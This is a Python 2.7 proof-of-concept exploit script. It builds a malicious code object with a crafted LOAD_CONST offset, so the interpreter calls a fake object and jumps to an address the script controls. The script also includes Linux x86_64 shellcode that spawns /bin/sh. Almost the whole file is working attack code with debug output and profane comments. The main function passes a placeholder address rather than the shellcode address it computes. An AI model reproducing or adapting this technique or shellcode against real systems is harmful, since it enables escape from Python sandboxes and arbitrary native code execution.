#!/usr/bin/env python
# -*- coding: utf-8 -*-

import struct
import types
import opcode
import platform
import sys
from ctypes import c_char

def get_string_object_padding():
    """
    Find at runtime the padding PyStringObject -> PyStringObject.ob_sval:
        typedef struct {        +
            PyObject_VAR_HEAD   |
            long ob_shash;      | We want to know that size
            int ob_sstate;      |
            char ob_sval[1];    +
        } PyStringObject;
    """
    marker = 'ABCDEFGH'
    r = (c_char * 100).from_address(id(marker))
    return r.raw.find(marker)

def pack_ushort(us):
    return struct.pack('<H', us)

def pack_uint(ui):
    return struct.pack('<Q', ui)

def get_opcode(o):
    return chr(opcode.opmap[o])

def redirect_exec_via_python27_opcodes_(addr_to_redirect):
    """Execute native x86_64 code abusing the Python VM"""

    def pull_the_trigger_b1tch():
        """Pull the trigger motherfucker"""
        pass

    padding_size = get_string_object_padding()


    # in PyObject_Call
    # RDI is addr_fake_object_controled
    # RAX will be addr_first_indirection_controled_data
    # RBX will be addr_to_redirect
    #    001d26b8 48 8b 47 08     MOV        RAX,qword ptr [RDI + 0x8]
    #    001d26bc 48 8b 98        MOV        RBX,qword ptr [0x80 + RAX]
    #    ...
    #    001d26f1 ff d3           CALL       RBX
    first_indirection = 'A' * 0x80 + pack_uint(addr_to_redirect)
    addr_first_indirection = id(first_indirection)
    addr_first_indirection_controled_data = addr_first_indirection + padding_size
    print 'addr_first_indirection_controled_data: ' + hex(addr_first_indirection_controled_data)

    fake_object = 'A' * 0x8 + pack_uint(addr_first_indirection_controled_data)
    addr_fake_object = id(fake_object)
    addr_fake_object_controled = addr_fake_object + padding_size
    print 'addr_fake_object_controled: ' + hex(addr_fake_object_controled)


    # The address of the object addr_fake_object_controled will be an element of the const_tuple
    # this is to make the offset between the const_tuple and the addres of addr_fake_object_controled less than two bytes
    # it needs to be 4 bytes aligned in order to work
    pointer_string = pack_uint(addr_fake_object_controled)
    const_tuple = ( 'AAAA' + pointer_string + 'AAAA', 'BBBBBBBB', 'CCCCCCCC' )
    addr_const_tuple = id(const_tuple)
    print 'addr_const_tuple: ' + hex(addr_const_tuple)

    r = (c_char * 1000000).from_address( addr_const_tuple )
    offset_pointer = r.raw.find( pointer_string )
    if offset_pointer < 0:
        print 'NO se encontro el primer elemento de la tupla'
        return
    addr_ptr_data_controled = addr_const_tuple + offset_pointer
    print 'addr_ptr_data_controled: ' + hex(addr_ptr_data_controled)


    # In PyEval_EvalFrameEx -> LOAD_CONST:
    # R14 is addr_const_tuple
    # offset will be RDX
    # R12 will be addr_ptr_data_controled
    #    001f5988 4d 8b 64        MOV        R12,qword ptr [R14 + RDX*0x8 + 0x18]
    #    001f598d 4d 8d 73 08     LEA        R14,[R11 + 0x8]
    #    001f5991 49 83 04        ADD        qword ptr [R12],0x1
    #    001f5996 4d 89 23        MOV        qword ptr [R11],R12
    offset = ((addr_ptr_data_controled - addr_const_tuple - 0x18) & 0xffffffffffffffff) / 0x8
    print 'offset: ' + hex(offset)
    if offset > 65535:
        print 'el offset es mayor que 0xffff'
        return

    assert (addr_const_tuple + offset * 0x8 + 0x18) == addr_ptr_data_controled

    # 1. Load an object from the const: This is an evil object :]
    evil_bytecode = get_opcode('LOAD_CONST') + pack_ushort(offset)
    # 2. Call the function on the top of stack: The evil function object :]
    evil_bytecode += get_opcode('CALL_FUNCTION') + '\x00\x00'

    pull_the_trigger_b1tch.func_code = types.CodeType(
        0, 0, 0, 0,
        evil_bytecode,
        const_tuple,
        (), (), "", "", 0, ""
    )

    raw_input('\ntrigger bug')
    pull_the_trigger_b1tch()

def main():
    system = platform.system()
    if system == 'Linux':
        # Execute /bin/sh - 27 bytes
        sh = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
    else:
        sh = '\xcc'
    address_shellcode = id(sh) + get_string_object_padding() # This won't work if NX is enabled

    redirect_exec_via_python27_opcodes_(0x414141414141)

if __name__ == '__main__':
    main()
